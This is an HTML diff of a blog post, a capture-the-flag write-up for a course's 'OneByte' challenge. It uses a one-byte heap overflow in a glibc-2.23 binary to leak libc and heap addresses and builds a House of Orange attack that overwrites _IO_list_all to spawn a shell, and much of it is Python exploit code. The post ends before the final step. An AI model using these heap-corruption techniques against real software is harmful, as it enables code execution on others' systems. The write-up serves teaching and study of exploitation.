@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>
+OneByte | 0x3nigma
+</title>
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Your website description">
+
+<meta name="generator" content="Hugo 0.165.0">
+
+
+<link rel="canonical" href="http://localhost:1313/posts/onebyte/" >
+
+
+
+
+<link href="/css/style.min.66302fa6c122ab7804faa4bd6465554ac4d746c25294af622826d0445b79ab94.css" rel="stylesheet">
+
+
+
+
+</head>
+
+<body>
+
+    <div class="flexWrapper">
+        <header class="headerWrapper">
+    <div class="header">
+        <div>
+            <a class="terminal" href="/">
+                <span>0x3nigma@localhost ~ $</span>
+            </a>
+        </div>
+        <input class="side-menu" type="checkbox" id="side-menu">
+        <label class="hamb" for="side-menu"><span class="hamb-line"></span></label>
+        <nav class="headerLinks">
+            <ul>
+                
+                <li>
+                    <a href="http://localhost:1313/posts/" title="" >
+                        ~/posts</a>
+                </li>
+                
+                <li>
+                    <a href="http://localhost:1313/about/" title="" >
+                        ~/about</a>
+                </li>
+                
+                <li>
+                    <a href="http://localhost:1313/categories/" title="" >
+                        ~/categories</a>
+                </li>
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="content">
+            <main class="main">
+                
+<div class="postWrapper">
+    <h1>OneByte</h1>
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+    
+
+    
+    <section class="postMetadata">
+        <dl>
+            
+            
+            
+                
+<dt>categories</dt>
+<dd><span></span>
+    <a href="/categories/binary-exploitation/">Binary Exploitation</a><span></span>
+    <a href="/categories/heap-exploitation/">Heap Exploitation</a></dd>
+            
+            
+                <dt>published</dt>
+                 
+                 
+                 <dd><time datetime="2026-10-08">2026-10-08</time></dd>
+            
+            
+                <dt>reading time</dt>
+                <dd>15 minutes</dd>
+            
+        </dl>
+    </section>
+    
+    <div>
+        <h3 id="acknowledgement">Acknowledgement:</h3>
+<p>This challenge belongs to the 
+<a href="https://www.udemy.com/course/linux-heap-exploitation-part-1/">Linux Heap Exploitation 1</a>
+ course by <strong>Max Kamper</strong> . It is the last and final challenge of this course. Max is a great teacher and a very experienced individual in this field and I highly recommend this course to anyone who wants a deep dive into linux heap exploitation .</p>
+<h3 id="challenge">Challenge:</h3>
+<p>We are given a binary which has all the modern protections turned on like PIE, NX, Stack Canary and FULL RELRO. It is linked against glibc-2.23.
+On starting the binary we are given a menu which allows us to allocate new chunks , free them, read them, edit them,
+and quit the binary. We can request for chunks only 16 times and on top of that the binary uses <code>calloc</code>
+instead of <code>malloc</code> which means chunks are zeroed out when returned  to the user to prevent any kind of info leak. Also we don&rsquo;t control the size of the chunks as we are given only 0x60 sized chunks. The binary doesnot leak the libc address or the heap address by default.
+Our goal is to <strong>drop a shell</strong>.</p>
+<h3 id="my-solution-for-the-challenge">My solution for the challenge:</h3>
+<h4 id="finding-the-bug">Finding the bug:</h4>
+<p>Upon inspection of the binary we can find out that there is a <strong>one-byte overflow</strong> and that is what the challenge name suggests. What can we do with a one-byte overflow ? Well&hellip; not a lot; but we control the least significant byte of the next chunk&rsquo;s size field which constitutes the flags like <code>PREV_INUSE</code> flag in its least significant nibble.</p>
+<h4 id="writing-the-exploit">Writing the exploit:</h4>
+<p>The first thing that we need to do is getting an info leak . We need to leak the libc&rsquo;s load address and the heap&rsquo;s address.</p>
+<ol>
+<li><strong>Leaking the libc load address</strong></li>
+</ol>
+<p>For leaking the libc&rsquo;s address we somehow need to make <code>malloc</code> write libc metadata to a chunk we can read from.But for that we need a chunk that is linked into one of the free lists(bins) and as a result will contain the linking metadata(pointers). But, what kind of free chunks contain libc metadata ? &hellip; Well; as for the chunks linked against the <strong>fastbin</strong> their user data is repurposed as a <strong>forward pointer</strong> and this forward pointer contains address of the next chunk which is a heap address and hence is not currently useful for us.
+As for the chunk that gets linked against the <strong>unsorted bin</strong> , its user data gets repurposed as a <strong>forward pointer(fd)</strong> and a <strong>backward pointer(bk)</strong>. If the chunk is linked as the first chunk, its <strong>fd</strong> and <strong>bk</strong> will contain the address of the head of the unsorted bin which resides inside the <strong>main_arena</strong> which is a data structure used to manage heap attached to the main thread. Since <strong>main_arena</strong> resides in the libc&rsquo;s <em>.data</em> section we can use this address to find the base of libc.</p>
+<p>Since we need a chunk that will get linked into an unsorted bin we need its size to be above 0x80 as any chunk lesser than or equal to 0x80 size will be linked into the appropriate fastbin when freed. Hence we can request 3 chunks from the program namely <code>A, B, C</code> and overwrite the B&rsquo;s size field with 0x91 using the one-byte overflow when writing data into chunk A . We can then create fake 0x30 chunk at 0x30 offset from the start of chunk C so that we have a sensible heap layout and at the same time prevent top-chunk consolidation when freeing the chunk B.</p>
+<p>We can then free chunk B to link against the unsorted bin and then our heap will look something like this :-</p>
+<p><img src="/Images/heap1.png" alt="alt"></p>
+<p>As we see there is the unsorted bin head&rsquo;s address in the fd and bk part of the chunk B . But unforunately we can&rsquo;t read that since we have freed chunk B. But what will happen if I request a new chunk now?</p>
+<p>Malloc will search if there is any free chunk in 0x60 sized fastbin or smallbin which it can return us. Since there isn&rsquo;t any it will then start searching the unsorted bin. It will find our 0x90 chunk and sort it into the appropriate small bin. Then it will do a <strong>binmap</strong> search to see which of the smallbins or largebins hold a chunk greater than 0x60 size. It will then find our 0x90 sized chunk in the smallbin and it will <strong>remainder</strong> that chunk and return us only the 0x60 portion out of it which is chunk B and will link the rest 0x30 part into the unsorted bin again. This process is called <strong>remaindering</strong>. Now, this 0x30 portion (the remainder) is the part of chunk C and it is a chunk we can read. Since this 0x30 chunk contains the link to the unsorted bin&rsquo;s head , we can easily read it and find the libc&rsquo;s base address by subtracting the correct offset.</p>
+<p>Here is how the heap will look after calling malloc :-</p>
+<p><img src="/Images/heap2.png" alt="alt"></p>
+<p>Here is the code:-</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>chunk_A <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>chunk_B <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>chunk_C <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x91</span>)
+</span></span><span style="display:flex;"><span>edit(chunk_A, payload1)
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x28</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x31</span>) <span style="color:#75715e"># Creating the fake 0x30 chunk</span>
+</span></span><span style="display:flex;"><span>edit(chunk_C, payload2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free(chunk_B)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Remaindering...</span>
+</span></span><span style="display:flex;"><span>chunk_B <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>addresses <span style="color:#f92672">=</span> read(chunk_C)
+</span></span><span style="display:flex;"><span>unsortedbin_addr <span style="color:#f92672">=</span> u64(addresses[:<span style="color:#ae81ff">8</span>])
+</span></span><span style="display:flex;"><span>main_arena_addr <span style="color:#f92672">=</span> unsortedbin_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x58</span>
+</span></span><span style="display:flex;"><span>libc_addr <span style="color:#f92672">=</span> main_arena_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>main_arena
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Leaked libc load address: </span><span style="color:#e6db74">{</span>hex(libc_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> libc_addr
+</span></span></code></pre></div><p>The above could also have been accomplished by requesting 4 chunks and overwriting chunkB&rsquo;s user data with 0xc0 and hence as a result we wouldn&rsquo;t have to create that 0x30 sized fake chunk inside chunk C as in this case chunk D will prevent top chunk consolidation. But I am trying to keep the number of malloc calls to minimum.</p>
+<ol start="2">
+<li><strong>Leaking the Heap Address:</strong></li>
+</ol>
+<p>For leaking the heap address we can create a new chunk of 0x90 size and link it into the unsorted bin. Our previous remainder chunk which we can still read will have its bk pointing to this new chunk and we can read it and subtract appropriate value to get the heap&rsquo;s address. To create the fake chunk we can request 3 chunks again at the beginning and create the fake chunk.</p>
+<p>Here is the heap after the above operation :-</p>
+<p><img src="/Images/heap3.png" alt="alt"></p>
+<p>Here is the code :-</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chunk_A <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>chunk_B <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>chunk_C <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chunk_D <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>chunk_E <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>chunk_F <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----- Leaking libc base address ----- </span>
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x91</span>)
+</span></span><span style="display:flex;"><span>edit(chunk_A, payload1)
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x28</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x31</span>)
+</span></span><span style="display:flex;"><span>edit(chunk_C, payload2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free(chunk_B)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Remaindering...</span>
+</span></span><span style="display:flex;"><span>chunk_B <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>addresses <span style="color:#f92672">=</span> read(chunk_C)
+</span></span><span style="display:flex;"><span>unsortedbin_addr <span style="color:#f92672">=</span> u64(addresses[:<span style="color:#ae81ff">8</span>])
+</span></span><span style="display:flex;"><span>main_arena_addr <span style="color:#f92672">=</span> unsortedbin_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x58</span>
+</span></span><span style="display:flex;"><span>libc_addr <span style="color:#f92672">=</span> main_arena_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>main_arena
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Leaked libc load address: </span><span style="color:#e6db74">{</span>hex(libc_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> libc_addr
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----- Leaking heap address -----</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Setting up the unsorted chunk.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>edit(chunk_D, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x91</span>))
+</span></span><span style="display:flex;"><span>edit(chunk_F, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x28</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x31</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free(chunk_E)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>heap_addr <span style="color:#f92672">=</span> u64(read(chunk_C)[<span style="color:#ae81ff">8</span>:<span style="color:#ae81ff">16</span>]) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x180</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(hex(heap_addr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><ol start="3">
+<li><strong>Using House of Orange for dropping the shell:</strong></li>
+</ol>
+<p>We can use House of Orange primitive to drop a shell since we were able to leak the libc and heap addresses. To do that we have to overwrite the <code>_IO_list_all ptr</code> and point it into the main arena. We know that the _chain ptr of the first file stream after <code>_IO_list_all ptr</code> points into the main_arena overlaps the bk of the 0x60 smallbin and hence we would need a chunk that we could write to , to be present in the 0x60 smallbin so that we could link and create our own fake file stream there. But that is not so easily possible as the request size is 0x60 and hence during the searching process it will always be returned to us instead of getting sorted into the smallbin.</p>
+<p>How do we solve this issue ? We know that in the size field the 3 least significant bits are used as flags while
+the 4th least significant bit contributes neither to the size nor to the flags and hence is always set to 0. During checking the size of a chunk malloc masks the flags . If we overwrite the 4th LSb malloc will see that the resulting size is not an exact fit and sort it rather than allocating it. So the size field we have to set is 0x68 or 0x69 with PREV_INUSE flag set so that it gets sorted into the smallbin rather than getting allocated to us.</p>
+<p>To achieve the above we would need 2 chunks that we completely control linked into the unsorted bin . When malloc starts searching from the end of the unsorted bin , the last chunk should get sorted in the 0x60 smallbin and then the first chunk would get allocated to us. During allocation , the first chunk will be partially unlinked and that is when we will overwrite the <code>_IO_list_all ptr</code> with the address of the head of the unsorted bin. Now since the chunk that got sorted into the 0x60 smallbin is controlled by us , we can then create a fake file stream there that satisifies the constraints . We will create the fake vtable in first chunk of the heap where we will overwrite the <code>__overflow</code> entry with the address of system. We will then quit the program which will trigger the abort function which will then call <code>_IO_flush_all_lockp</code> to flush the filestreams and that is when it will follow the <code>_chain</code> ptr of the first fake filestream in main arena to our crafted file stream and follow the vtable ptr to the vtable and then call the function pointed by <code>__overflow</code> which now points to the <code>system</code> function and its first argument will be the pointer to our file stream that has the first bytes set as <strong>/bin/sh\00</strong> and as a result a shell will be dropped.</p>
+<p>The code below explains how to link 2 controlled chunks :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>chunk_A <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>chunk_B <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>chunk_C <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chunk_D <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>chunk_E <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>chunk_F <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chunk_G <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>chunk_H <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----- Leaking libc base address ----- </span>
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x91</span>)
+</span></span><span style="display:flex;"><span>edit(chunk_A, payload1)
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x28</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x31</span>)
+</span></span><span style="display:flex;"><span>edit(chunk_C, payload2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free(chunk_B)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Remaindering...</span>
+</span></span><span style="display:flex;"><span>chunk_B <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>addresses <span style="color:#f92672">=</span> read(chunk_C)
+</span></span><span style="display:flex;"><span>unsortedbin_addr <span style="color:#f92672">=</span> u64(addresses[:<span style="color:#ae81ff">8</span>])
+</span></span><span style="display:flex;"><span>main_arena_addr <span style="color:#f92672">=</span> unsortedbin_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x58</span>
+</span></span><span style="display:flex;"><span>libc_addr <span style="color:#f92672">=</span> main_arena_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>main_arena
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Leaked libc load address: </span><span style="color:#e6db74">{</span>hex(libc_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> libc_addr
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----- Leaking heap address -----</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Setting up the unsorted chunk.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>edit(chunk_D, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x91</span>))
+</span></span><span style="display:flex;"><span>edit(chunk_F, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x28</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x31</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free(chunk_E)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>heap_addr <span style="color:#f92672">=</span> u64(read(chunk_C)[<span style="color:#ae81ff">8</span>:<span style="color:#ae81ff">16</span>]) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x180</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Leaked heap address: </span><span style="color:#e6db74">{</span>hex(heap_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Restoring the heap state</span>
+</span></span><span style="display:flex;"><span>edit(chunk_B, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x61</span>))
+</span></span><span style="display:flex;"><span>edit(chunk_D, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x61</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chunk_C <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>chunk_E <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Creating 2 chunks to get them linked into the unsorted bin.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>edit(chunk_A, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0xc1</span>))
+</span></span><span style="display:flex;"><span>edit(chunk_D, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0xc1</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Freeing those chunks</span>
+</span></span><span style="display:flex;"><span>free(chunk_B)
+</span></span><span style="display:flex;"><span>free(chunk_E)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Requesting a chunk due to which remaindering will take place and we will be returned</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># chunk B. chunk C will still be linked into the unsorted bin and it is a chunk we control.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Chunk E will be in the 0xc0 smallbin.</span>
+</span></span><span style="display:flex;"><span>chunk_B <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Overwriting the size of chunk C with 0x31 so that it doesnot get allocated to us again in the next</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># malloc call and instead be sorted. Malloc will then remainder chunk_E and link chunk F into the unsorted bin.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># We control chunk F.</span>
+</span></span><span style="display:flex;"><span>edit(chunk_B, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x31</span>))
+</span></span><span style="display:flex;"><span>unsortedbin_head_addr <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>main_arena <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x58</span>
+</span></span><span style="display:flex;"><span>edit(chunk_C, p64(unsortedbin_head_addr) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x31</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chunk_E <span style="color:#f92672">=</span> malloc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Since chunk C is now in 0x30 small bin we  will have to relink it again in unsorted bin. </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># We are going to overwrite the size field of chunk C with 0x61 to bring it to actual size </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># then we will overwrite size field of chunk D with 0x90 and freeing it</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># which will lead to backward consolidation with chunk C and will get linked into the unsorted bin again.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Hence we have 2 chunks linked into the unsortedbin whom we control completely.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>edit(chunk_B, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x61</span>))
+</span></span><span style="display:flex;"><span>smallbin30_head_addr <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>main_arena <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x78</span>
+</span></span><span style="display:flex;"><span>edit(chunk_C, p64(smallbin30_head_addr)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x40</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x60</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x90</span>))
+</span></span><span style="display:flex;"><span>edit(chunk_E, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x28</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x31</span>)) <span style="color:#75715e"># For a stable heap since chunk D is now 0x90 sized.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free(chunk_D)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Now the unsorted bin contains chunk C as its first element and chunk_F as its last element.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Since search for a chunk starts from the last of the unsorted bin... </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># what we are going to do is make chunk F 0x68 sized and chunk C 0x60 sized.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># So when malloc starts from last it will sort chunk F into the 0x60 small bin and then allocate chunkC .</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># While allocating chunk C it will partially unlink it so we will overwrite the bk of chunk C with address</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 16 bytes before _IO_list_all ptr and as a result _IO_list_all will be overwritten.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>edit(chunk_B, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x58</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x61</span>))
+</span></span><span style="display:flex;"><span>edit(chunk_E, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x28</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x31</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x28</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x69</span>))
+</span></span><span style="display:flex;"><span>edit(chunk_G, p64(<span style="color:#ae81ff">0x58</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Changing the bk of chunk C</span>
+</span></span><span style="display:flex;"><span>edit(chunk_C, p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_IO_list_all <span style="color:#f92672">-</span> <span style="color:#ae81ff">16</span>))
+</span></span></code></pre></div><p>Before calling the final malloc() the heap should look like this :</p>
+<p><img src="/Images/heap4.png" alt="alt"></p>
+<p>Then we call the final malloc() :</p>
